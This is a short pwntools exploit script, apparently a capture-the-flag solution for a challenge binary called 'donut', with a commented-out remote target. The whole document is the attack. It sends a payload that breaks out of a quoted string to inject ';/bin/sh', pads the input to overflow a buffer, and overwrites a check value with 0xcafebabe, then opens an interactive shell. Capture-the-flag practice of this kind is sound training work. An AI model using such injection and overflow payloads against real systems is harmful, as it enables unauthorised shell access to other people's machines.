from pwn import *
#p=remote("pwn.ctf.uscybergames.com",5000)
p=process("./donut")
shell= b'UTC"\';/bin/sh #'
#print(shell)
#input()
p.sendlineafter(b'> ',shell+b'a'*(36-len(shell))+p64(0xcafebabe))
p.sendlineafter(b'> ',b'3')
p.interactive()
